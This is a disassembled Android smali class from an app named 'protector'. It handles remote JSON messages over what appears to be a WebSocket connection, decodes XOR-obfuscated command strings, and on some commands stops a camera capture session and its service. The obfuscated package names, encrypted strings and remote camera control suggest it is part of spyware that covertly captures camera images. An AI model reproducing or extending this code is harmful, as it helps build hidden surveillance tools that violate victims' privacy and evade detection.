.class Lcom/icontrol/protector/CameraCap$a$a;
.super Lntidisestablish/neumonoul/floccinaucinih/o70;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/CameraCap$a;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field a:Ljava/lang/Boolean;

.field final synthetic b:Lcom/icontrol/protector/CameraCap$a;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/CameraCap$a;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/CameraCap$a$a;->b:Lcom/icontrol/protector/CameraCap$a;

    invoke-direct {p0}, Lntidisestablish/neumonoul/floccinaucinih/o70;-><init>()V

    sget-object p1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    iput-object p1, p0, Lcom/icontrol/protector/CameraCap$a$a;->a:Ljava/lang/Boolean;

    return-void
.end method


# virtual methods
.method public b(Lntidisestablish/neumonoul/floccinaucinih/m70;ILjava/lang/String;)V
    .locals 0

    .line 1
    invoke-super {p0, p1, p2, p3}, Lntidisestablish/neumonoul/floccinaucinih/o70;->b(Lntidisestablish/neumonoul/floccinaucinih/m70;ILjava/lang/String;)V

    invoke-virtual {p0}, Lcom/icontrol/protector/CameraCap$a$a;->g()V

    return-void
.end method

.method public c(Lntidisestablish/neumonoul/floccinaucinih/m70;Ljava/lang/Throwable;Lntidisestablish/neumonoul/floccinaucinih/dy;)V
    .locals 0

    .line 1
    invoke-super {p0, p1, p2, p3}, Lntidisestablish/neumonoul/floccinaucinih/o70;->c(Lntidisestablish/neumonoul/floccinaucinih/m70;Ljava/lang/Throwable;Lntidisestablish/neumonoul/floccinaucinih/dy;)V

    invoke-virtual {p0}, Lcom/icontrol/protector/CameraCap$a$a;->g()V

    return-void
.end method

.method public d(Lntidisestablish/neumonoul/floccinaucinih/m70;Ljava/lang/String;)V
    .locals 4

    .line 1
    invoke-super {p0, p1, p2}, Lntidisestablish/neumonoul/floccinaucinih/o70;->d(Lntidisestablish/neumonoul/floccinaucinih/m70;Ljava/lang/String;)V

    :try_start_0
    new-instance p1, Lorg/json/JSONObject;

    invoke-direct {p1, p2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const/4 p2, 0x4

    new-array v0, p2, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x5

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v0, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    new-array p2, p2, [B

    fill-array-data p2, :array_4

    new-array v0, v1, [B

    fill-array-data v0, :array_5

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-nez p2, :cond_0

    const/16 p2, 0x13

    new-array p2, p2, [B

    fill-array-data p2, :array_6

    new-array v0, v1, [B

    fill-array-data v0, :array_7

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1

    :cond_0
    invoke-virtual {p0}, Lcom/icontrol/protector/CameraCap$a$a;->g()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    return-void

    :array_0
    .array-data 1
        0x5t
        -0x1t
        0x7dt
        -0x7et
    .end array-data

    :array_1
    .array-data 1
        0x71t
        -0x7at
        0xdt
        -0x19t
        -0x6et
        0x1ft
        -0x4et
        0x27t
    .end array-data

    :array_2
    .array-data 1
        -0x61t
        0x2ct
        -0x36t
        0x7et
        -0x44t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x6t
        0x41t
        -0x46t
        0xat
        -0x3bt
        0x5t
        0x47t
        -0x3bt
    .end array-data

    :array_4
    .array-data 1
        -0x5t
        -0x68t
        0x50t
        0x62t
    .end array-data

    :array_5
    .array-data 1
        -0x78t
        -0x14t
        0x3ft
        0x12t
        0x21t
        -0x40t
        -0x47t
        -0x3t
    .end array-data

    :array_6
    .array-data 1
        -0x10t
        -0x78t
        -0x68t
        0x3at
        -0x4ft
        0x51t
        0x2at
        0x20t
        -0x34t
        -0x64t
        -0x64t
        0x2bt
        -0x1bt
        0x58t
        0x26t
        0x31t
        -0x40t
        -0x6bt
        -0x76t
    .end array-data

    :array_7
    .array-data 1
        -0x5bt
        -0x1at
        -0x7t
        0x4ft
        -0x3bt
        0x39t
        0x45t
        0x52t
    .end array-data
.end method

.method public f(Lntidisestablish/neumonoul/floccinaucinih/m70;Lntidisestablish/neumonoul/floccinaucinih/dy;)V
    .locals 0

    .line 1
    new-instance p1, Lcom/icontrol/protector/CameraCap$a$a$a;

    invoke-direct {p1, p0}, Lcom/icontrol/protector/CameraCap$a$a$a;-><init>(Lcom/icontrol/protector/CameraCap$a$a;)V

    invoke-virtual {p1}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public g()V
    .locals 3

    .line 1
    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    iput-object v0, p0, Lcom/icontrol/protector/CameraCap$a$a;->a:Ljava/lang/Boolean;

    :try_start_0
    sget-object v0, Lcom/icontrol/protector/CameraCap;->p:Lntidisestablish/neumonoul/floccinaucinih/m70;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    invoke-interface {v0}, Lntidisestablish/neumonoul/floccinaucinih/m70;->a()V

    sput-object v1, Lcom/icontrol/protector/CameraCap;->p:Lntidisestablish/neumonoul/floccinaucinih/m70;

    :cond_0
    iget-object v0, p0, Lcom/icontrol/protector/CameraCap$a$a;->b:Lcom/icontrol/protector/CameraCap$a;

    iget-object v0, v0, Lcom/icontrol/protector/CameraCap$a;->f:Lcom/icontrol/protector/CameraCap;

    invoke-static {v0}, Lcom/icontrol/protector/CameraCap;->d(Lcom/icontrol/protector/CameraCap;)Lntidisestablish/neumonoul/floccinaucinih/ks;

    move-result-object v0

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/icontrol/protector/CameraCap$a$a;->b:Lcom/icontrol/protector/CameraCap$a;

    iget-object v0, v0, Lcom/icontrol/protector/CameraCap$a;->f:Lcom/icontrol/protector/CameraCap;

    invoke-static {v0}, Lcom/icontrol/protector/CameraCap;->d(Lcom/icontrol/protector/CameraCap;)Lntidisestablish/neumonoul/floccinaucinih/ks;

    move-result-object v0

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/ks;->o()Lntidisestablish/neumonoul/floccinaucinih/ce;

    move-result-object v0

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/ce;->a()V

    iget-object v0, p0, Lcom/icontrol/protector/CameraCap$a$a;->b:Lcom/icontrol/protector/CameraCap$a;

    iget-object v0, v0, Lcom/icontrol/protector/CameraCap$a;->f:Lcom/icontrol/protector/CameraCap;

    invoke-static {v0}, Lcom/icontrol/protector/CameraCap;->d(Lcom/icontrol/protector/CameraCap;)Lntidisestablish/neumonoul/floccinaucinih/ks;

    move-result-object v0

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/ks;->l()Lntidisestablish/neumonoul/floccinaucinih/da;

    move-result-object v0

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/da;->a()V

    iget-object v0, p0, Lcom/icontrol/protector/CameraCap$a$a;->b:Lcom/icontrol/protector/CameraCap$a;

    iget-object v0, v0, Lcom/icontrol/protector/CameraCap$a;->f:Lcom/icontrol/protector/CameraCap;

    invoke-static {v0}, Lcom/icontrol/protector/CameraCap;->d(Lcom/icontrol/protector/CameraCap;)Lntidisestablish/neumonoul/floccinaucinih/ks;

    move-result-object v0

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/ks;->o()Lntidisestablish/neumonoul/floccinaucinih/ce;

    move-result-object v0

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/ce;->c()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    iget-object v0, p0, Lcom/icontrol/protector/CameraCap$a$a;->b:Lcom/icontrol/protector/CameraCap$a;

    iget-object v0, v0, Lcom/icontrol/protector/CameraCap$a;->f:Lcom/icontrol/protector/CameraCap;

    invoke-static {v0, v1}, Lcom/icontrol/protector/CameraCap;->e(Lcom/icontrol/protector/CameraCap;Lntidisestablish/neumonoul/floccinaucinih/ks;)Lntidisestablish/neumonoul/floccinaucinih/ks;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    iget-object v0, p0, Lcom/icontrol/protector/CameraCap$a$a;->b:Lcom/icontrol/protector/CameraCap$a;

    iget-object v0, v0, Lcom/icontrol/protector/CameraCap$a;->f:Lcom/icontrol/protector/CameraCap;

    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Lcom/icontrol/protector/CameraCap;

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/q8;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v2

    if-eqz v2, :cond_2

    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v2}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    :cond_2
    return-void
.end method
